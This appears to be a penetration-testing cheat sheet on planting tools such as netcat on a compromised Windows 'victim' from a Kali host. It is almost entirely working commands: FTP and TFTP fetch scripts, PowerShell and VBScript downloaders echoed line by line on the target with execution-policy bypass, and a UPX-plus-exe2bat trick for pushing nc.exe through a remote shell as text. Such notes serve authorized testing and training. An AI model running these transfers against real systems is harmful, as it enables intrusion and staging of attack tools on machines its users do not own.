Uploading Tools to Windows
================================================================================

<br>

<details>
  <summary><b><u>
  FTP to FTPd
  </u></b></summary>

FTP to FTPd
--------------------------------------------------------------------------------

### [1] Prep the server

Recommend trying the Python ftp server first. It has often worked with Windows' built-in FTP client, and it leaves no lasting impact on your Kali system.

#### [1A] Option A: PureFTPd

One-time setup:

```
root@kali:~# apt-get install –y pure-ftpd
root@kali:~# groupadd ftpgroup
root@kali:~# useradd –g ftpgroup -d /dev/null –s /etc ftpuser
root@kali:~# pure-pw useradd hi5 –u ftpuser –d /ftphome
root@kali:~# pure-pw mkdb
root@kali:~# cd /etc/pure-ftpd/auth/
root@kali:~# ln –s ../conf/PureDB 60pdb
root@kali:~# mkdir –p /ftphome
root@kali:~# chown –R ftpuser:ftpgroup /ftphome/
```

Run the server:

```
root@kali:~# cp <tool.exe> /ftphome/
root@kali:~# systemctl start pure-ftpd.service
```

#### [1B] Option B: Python pyftpdlib

```
root@kali:~# cd /usr/share/windows-binaries/
root@kali:/usr/share/windows-binaries/# python -m pyftpdlib -p 21
```

### [2] Execute the transfer

```
victim> echo open <kali_ip_addr> > pre
victim> echo USER hi5 >> pre
victim> echo PASS 5ih >> pre
victim> echo ftp >> pre
victim> echo bin >> pre
victim> copy pre ftp
victim> echo GET tool.exe >> ftp
victim> echo bye >> ftp
victim> ftp –v –n –s:ftp
```

### [3] Tear down the server

For a Python pyftpdlib server, just hit <kbd>ctrl</kbd>+<kbd>C</kbd>.

For a PureFTPd server:

```
root@kali:~# systemctl stop pure-ftpd.service
```

<br>
</details>

<details>
  <summary><b><u>
  TFTP to TFTPd
  </u></b></summary>

TFTP to TFTPd
--------------------------------------------------------------------------------

*Fast if TFTP has been enabled.*

### One-time prep.

```
root@kali:~# mkdir /tftp
```

### Set up server.

```
root@kali:~# cp tool.exe /tftp/
root@kali:~# atftpd --daemon --port 69 /tftp
```

### Execute transfer

```
victim> tftp -i <kali_ip> get nc.exe
```

### Tear down server

```
root@kali:~# ps aux | grep atftpd
root@kali:~# kill -9 <PID>
```

<br>
</details>

<details>
  <summary><b><u>
  PowerShell “wget” to HTTPd (Windows 7, 2008, +)
  </u></b></summary>

PowerShell “wget” to HTTPd
--------------------------------------------------------------------------------

(Windows 7, 2008, +)

### Set up server.

```
root@kali:~# cp </dir/tool.exe> .
root@kali:~# python –m SimpleHTTPServer 80
```

### Build Powershell tool

```
victim> echo $storageDir = $pwd > wget.ps1
victim> echo $webclient = New-Object System.Net.WebClient >> wget.ps1
victim> echo $url = "http://<kali_ip_addr>/tool.exe" >> wget.ps1
victim> echo $file = ”tool.exe" >> wget.ps1
victim> echo $webclient.DownloadFile($url,$file) >> wget.ps1
```

### Run Powershell tool

```
victim> powershell.exe –ExecutionPolicy Bypass –NoLogo -NonInteractive –NoProfile –File wget.ps1
```

### Tear down server

On Kali, <kbd>ctrl</kbd>+<kbd>C</kbd>.

<br>
</details>

<details>
  <summary><b><u>
  VBScript “wget” to HTTPd (Windows XP, 2003)
  </u></b></summary>

VBScript “wget” to HTTPd
--------------------------------------------------------------------------------

(Windows XP, 2003)

### Set up server.

```
root@kali:~# cp </dir/tool.exe> .
root@kali:~# python –m SimpleHTTPServer 80
```

### Build VBS tool

```
victim> echo strUrl = WScript.Arguments.Item(0) > wget.vbs
victim> echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
victim> echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
victim> echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
victim> echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
victim> echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
victim> echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
victim> echo Err.Clear >> wget.vbs
victim> echo Set http = Nothing >> wget.vbs
victim> echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
victim> echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
victim> echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
victim> echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
victim> echo http.Open "GET", strURL, False >> wget.vbs
victim> echo http.Send >> wget.vbs
victim> echo varByteArray = http.ResponseBody >> wget.vbs
victim> echo Set http = Nothing >> wget.vbs
victim> echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
victim> echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
victim> echo strData = "" >> wget.vbs
victim> echo strBuffer = "" >> wget.vbs
victim> echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
victim> echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
victim> echo Next >> wget.vbs
victim> echo ts.Close >> wget.vbs
```

### Run VBS tool

```
victim> cscript wget.vbs http://<kali_ip_addr>/tool.exe tool.exe
```

### Tear down server

On Kali, <kbd>ctrl</kbd>+<kbd>C</kbd>.

<br>
</details>

<details>
  <summary><b><u>
  Transfer PE as text in remote shell
  </u></b></summary>

Transfer PE as text in remote shell
--------------------------------------------------------------------------------

```
root@kali:~# cp /path/exe2bat.exe .
root@kali:~# cp /path/nc.exe .
root@kali:~# upx -9 nc.exe
root@kali:~# wine exe2bat.exe nc.exe nc.txt
root@kali:~# echo ""; cat nc.txt
```

Copy the contents of `nc.txt` and paste them into the victim’s remote shell. (The file contains many echo commands with hex values, then commands for `debug.exe` to reassemble and rename the executable.)

<br>
</details>

<br>